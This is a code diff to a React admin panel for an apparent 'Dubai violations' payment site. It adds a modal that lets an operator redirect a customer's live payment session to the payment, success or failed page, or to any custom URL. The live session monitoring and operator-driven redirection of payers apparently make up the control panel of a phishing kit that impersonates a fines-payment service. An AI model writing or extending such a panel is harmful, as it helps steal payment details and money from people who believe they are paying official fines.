@@ -278,6 +278,9 @@ export default function AdminPanel() {
   const [searchQuery, setSearchQuery] = useState("");
   const [notification, setNotification] = useState<{ message: string; type: "success" | "error" | "info" } | null>(null);
   const notifTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const [redirectSession, setRedirectSession] = useState<PaymentSession | null>(null);
+  const [redirectUrl, setRedirectUrl] = useState("");
+  const redirectMutation = trpc.admin.redirect.useMutation();
 
   const showNotif = (message: string, type: "success" | "error" | "info") => {
     setNotification({ message, type });
@@ -485,8 +488,106 @@ export default function AdminPanel() {
         />
       )}
 
+      {/* Modal إعادة التوجيه */}
+      {redirectSession && token && (
+        <div className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4" dir="rtl">
+          <div className="bg-white rounded-2xl shadow-2xl w-full max-w-md p-6">
+            <div className="flex items-center gap-3 mb-5">
+              <div className="w-10 h-10 bg-purple-100 rounded-xl flex items-center justify-center">
+                <svg className="w-5 h-5 text-purple-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 011.447-.894L9 7m0 13l6-3m-6 3V7m6 10l4.553 2.276A1 1 0 0021 18.382V7.618a1 1 0 00-.553-.894L15 4m0 13V4m0 0L9 7" />
+                </svg>
+              </div>
+              <div>
+                <h3 className="text-gray-800 font-bold text-base">توجيه العميل</h3>
+                <p className="text-gray-500 text-xs">{redirectSession.sessionId.slice(0, 12)}</p>
+              </div>
+              <button onClick={() => setRedirectSession(null)} className="mr-auto text-gray-400 hover:text-gray-600">
+                <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
+                </svg>
+              </button>
+            </div>
+
+            {/* صفحات سريعة */}
+            <div className="mb-4">
+              <p className="text-gray-600 text-sm font-medium mb-2">اختر صفحة:</p>
+              <div className="grid grid-cols-2 gap-2">
+                {[
+                  { label: "🏠 الرئيسية", url: "/" },
+                  { label: "💳 صفحة الدفع", url: "/payment" },
+                  { label: "✅ نجاح الدفع", url: "/success" },
+                  { label: "❌ فشل الدفع", url: "/failed" },
+                ].map(page => (
+                  <button
+                    key={page.url}
+                    onClick={() => setRedirectUrl(page.url)}
+                    className={`px-3 py-2 rounded-lg text-sm text-right transition border ${
+                      redirectUrl === page.url
+                        ? "bg-purple-600 text-white border-purple-600"
+                        : "bg-gray-50 text-gray-700 border-gray-200 hover:border-purple-300"
+                    }`}
+                  >
+                    {page.label}
+                  </button>
+                ))}
+              </div>
+            </div>
+
+            {/* رابط مخصص */}
+            <div className="mb-5">
+              <p className="text-gray-600 text-sm font-medium mb-1.5">أو أدخل رابط مخصص:</p>
+              <input
+                type="text"
+                value={redirectUrl}
+                onChange={e => setRedirectUrl(e.target.value)}
+                placeholder="/payment?session=xxx أو https://..."
+                className="w-full border border-gray-200 rounded-lg px-3 py-2 text-sm text-gray-700 focus:outline-none focus:border-purple-400 focus:ring-1 focus:ring-purple-200"
+                dir="ltr"
+              />
+            </div>
+
+            <div className="flex gap-2">
+              <button
+                onClick={async () => {
+                  if (!redirectUrl.trim()) return;
+                  try {
+                    await redirectMutation.mutateAsync({
+                      token,
+                      sessionId: redirectSession.sessionId,
+                      redirectUrl: redirectUrl.trim(),
+                    });
+                    showNotif("تم توجيه العميل بنجاح", "success");
+                    setRedirectSession(null);
+                  } catch (err: any) {
+                    showNotif(err.message || "حدث خطأ", "error");
+                  }
+                }}
+                disabled={!redirectUrl.trim() || redirectMutation.isPending}
+                className="flex-1 bg-purple-600 hover:bg-purple-700 disabled:opacity-50 text-white py-2.5 rounded-xl font-bold text-sm transition flex items-center justify-center gap-2"
+              >
+                {redirectMutation.isPending ? (
+                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
+                ) : (
+                  <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z" />
+                  </svg>
+                )}
+                توجيه العميل
+              </button>
+              <button
+                onClick={() => setRedirectSession(null)}
+                className="px-4 py-2.5 bg-gray-100 hover:bg-gray-200 text-gray-600 rounded-xl font-medium text-sm transition"
+              >
+                إلغاء
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
       {/* ===== الهيدر ===== */}
-      <header style={{ background: "linear-gradient(90deg, #1a2744 0%, #0f1f3d 100%)" }} className="px-6 py-3 flex items-center justify-between shadow-lg">
+      <header className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between shadow-sm">
         {/* يمين: الشعار والعنوان */}
         <div className="flex items-center gap-3">
           <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow">
@@ -496,8 +597,8 @@ export default function AdminPanel() {
             </svg>
           </div>
           <div>
-            <h1 className="text-white font-bold text-sm leading-tight">نظام مخالفات دبي</h1>
-            <p className="text-blue-300 text-xs">لوحة التحكم</p>
+            <h1 className="text-gray-800 font-bold text-sm leading-tight">نظام مخالفات دبي</h1>
+            <p className="text-blue-600 text-xs font-semibold">لوحة التحكم</p>
           </div>
         </div>
 
@@ -505,15 +606,15 @@ export default function AdminPanel() {
         <div className="flex items-center gap-3">
           {/* متصل */}
           <div className="flex items-center gap-1.5">
-            <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse" />
-            <span className="text-green-400 text-xs font-medium">متصل</span>
+            <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
+            <span className="text-green-600 text-xs font-medium">متصل</span>
           </div>
 
           {/* عداد الإشعارات */}
           {newCount > 0 && (
             <div className="relative">
-              <div className="w-8 h-8 bg-white/10 rounded-full flex items-center justify-center">
-                <svg className="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <div className="w-8 h-8 bg-gray-100 rounded-full flex items-center justify-center">
+                <svg className="w-4 h-4 text-gray-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                   <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" />
                 </svg>
               </div>
@@ -526,10 +627,10 @@ export default function AdminPanel() {
           {/* تحديث */}
           <button
             onClick={() => { sessionsQuery.refetch(); statsQuery.refetch(); }}
-            className="w-8 h-8 bg-white/10 hover:bg-white/20 rounded-full flex items-center justify-center transition"
+            className="w-8 h-8 bg-gray-100 hover:bg-gray-200 rounded-full flex items-center justify-center transition"
             title="تحديث"
           >
-            <svg className="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <svg className="w-4 h-4 text-gray-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
               <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
             </svg>
           </button>
@@ -725,7 +826,8 @@ export default function AdminPanel() {
 
                           {/* زر توجيه */}
                           <button
-                            className="flex items-center gap-1 bg-gray-100 hover:bg-gray-200 text-gray-600 px-2.5 py-1.5 rounded-lg text-xs font-medium transition"
+                            onClick={() => { setRedirectSession(s); setRedirectUrl(""); }}
+                            className="flex items-center gap-1 bg-purple-100 hover:bg-purple-200 text-purple-700 px-2.5 py-1.5 rounded-lg text-xs font-medium transition"
                           >
                             <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                               <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 011.447-.894L9 7m0 13l6-3m-6 3V7m6 10l4.553 2.276A1 1 0 0021 18.382V7.618a1 1 0 00-.553-.894L15 4m0 13V4m0 0L9 7" />
